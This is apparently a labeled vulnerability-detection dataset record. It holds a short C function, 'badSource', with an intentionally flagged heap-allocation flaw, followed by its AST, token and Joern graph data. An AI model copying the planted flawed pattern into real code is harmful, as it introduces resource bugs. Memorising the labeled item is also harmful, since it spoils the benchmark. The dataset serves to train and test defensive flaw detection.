-----label-----
1
-----code-----
static wchar_t * badSource(wchar_t * data)
{
    /* POTENTIAL FLAW: Allocate memory on the heap */
    data = (wchar_t *)calloc(100, sizeof(wchar_t));
    if (data == NULL) {exit(-1);}
    /* Initialize and make use of data */
    wcscpy(data, L"A String");
    printWLine(data);
    return data;
}
-----children-----
1,2
1,3
1,4
3,4
3,5
3,6
6,7
6,8
8,9
8,10
11,12
11,13
11,14
11,15
11,16
12,13
13,14
13,15
14,15
16,17
16,18
17,18
17,19
19,20
21,22
21,23
21,24
22,23
25,26
26,27
26,28
29,30
29,31
30,31
30,32
31,32
33,34
35,36
36,37
37,38
37,39
38,39
40,41
42,43
43,44
43,45
43,46
44,45
46,47
49,50
50,51
50,52
51,52
53,54
55,56
56,57
-----nextToken-----
2,4,5,7,9,10,15,18,20,23,24,27,28,32,34,39,41,45,47,48,52,54,57
-----computeFrom-----
13,14
13,15
30,31
30,32
-----guardedBy-----
-----guardedByNegation-----
-----lastLexicalUse-----
-----jump-----
-----attribute-----
FunctionDefinition;SimpleDeclSpecifier;FunctionDeclarator;Pointer;Name;ParameterDeclaration;SimpleDeclSpecifier;Declarator;Pointer;Name;CompoundStatement;ExpressionStatement;BinaryExpression;IdExpression;Name;CastExpression;TypeId;SimpleDeclSpecifier;Declarator;Pointer;FunctionCallExpression;IdExpression;Name;LiteralExpression;TypeIdExpression;TypeId;SimpleDeclSpecifier;Declarator;IfStatement;BinaryExpression;IdExpression;Name;IdExpression;Name;CompoundStatement;ExpressionStatement;FunctionCallExpression;IdExpression;Name;UnaryExpression;LiteralExpression;ExpressionStatement;FunctionCallExpression;IdExpression;Name;IdExpression;Name;LiteralExpression;ExpressionStatement;FunctionCallExpression;IdExpression;Name;IdExpression;Name;ReturnStatement;IdExpression;Name;
-----ast_node-----
static wchar_t * badSource(wchar_t * data){    /* POTENTIAL FLAW: Allocate memory on the heap */    data = (wchar_t *)calloc(100, sizeof(wchar_t));    if (data == NULL) {exit(-1);}    /* Initialize and make use of data */    wcscpy(data, L"A String");    printWLine(data);    return data;}
static wchar_t
* badSource(wchar_t * data)
*
badSource
wchar_t * data
wchar_t
* data
*
data
{    /* POTENTIAL FLAW: Allocate memory on the heap */    data = (wchar_t *)calloc(100, sizeof(wchar_t));    if (data == NULL) {exit(-1);}    /* Initialize and make use of data */    wcscpy(data, L"A String");    printWLine(data);    return data;}
data = (wchar_t *)calloc(100, sizeof(wchar_t));
data = (wchar_t *)calloc(100, sizeof(wchar_t))
data
data
(wchar_t *)calloc(100, sizeof(wchar_t))
wchar_t *
wchar_t
*
*
calloc(100, sizeof(wchar_t))
calloc
calloc
100
sizeof(wchar_t)
wchar_t
wchar_t

if (data == NULL) {exit(-1);}
data == NULL
data
data
NULL
NULL
{exit(-1);}
exit(-1);
exit(-1)
exit
exit
-1
1
wcscpy(data, L"A String");
wcscpy(data, L"A String")
wcscpy
wcscpy
data
data
L"A String"
printWLine(data);
printWLine(data)
printWLine
printWLine
data
data
return data;
data
data
-----joern-----
(13,17,0)
(4,9,0)
(17,13,0)
(15,13,0)
(22,17,0)
(17,9,0)
(11,14,0)
(17,22,0)
(13,12,0)
(6,20,0)
(5,12,0)
(9,0,0)
(20,13,0)
(10,18,0)
(13,14,0)
(10,8,0)
(20,12,0)
(2,20,0)
(23,8,0)
(19,12,0)
(3,11,0)
(9,17,0)
(20,14,0)
(21,0,0)
(19,14,0)
(7,19,0)
(19,13,0)
(8,10,0)
(0,9,0)
(11,13,0)
(1,11,0)
(11,14,1)
(23,11,1)
(17,9,1)
(3,13,1)
(20,6,1)
(2,20,1)
(19,13,1)
(17,22,1)
(11,13,1)
(9,0,1)
(13,17,1)
(1,3,1)
(4,15,1)
(19,14,1)
(8,23,1)
(6,19,1)
(20,14,1)
(7,11,1)
(13,14,1)
(19,7,1)
(7,10,1)
(20,13,1)
(11,1,1)
(10,8,1)
(21,4,1)
(0,21,1)
(13,14,2)
(11,13,2)
(20,14,2)
(8,11,2)
(13,17,2)
(17,22,2)
(10,8,2)
(20,13,2)
(19,13,2)
(2,20,2)
(11,14,2)
(9,0,2)
(23,11,2)
(19,14,2)
(10,11,2)
(17,9,2)
-----------------------------------
(0,sizeof(wchar_t)
(1,NULL)
(2,RET)
(3,data)
(4,100)
(5,if (data == NULL)
(6,data)
(7,data)
(8,-1)
(9,calloc(100, sizeof(wchar_t)
(10,exit(-1)
(11,data == NULL)
(12,)
(13,data = (wchar_t *)
(14,wchar_t * data)
(15,data)
(16, sizeof(wchar_t)
(17,(wchar_t *)
(18,)
(19,printWLine(data)
(20,return data;)
(21,wchar_t)
(22,wchar_t *)
(23,1)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^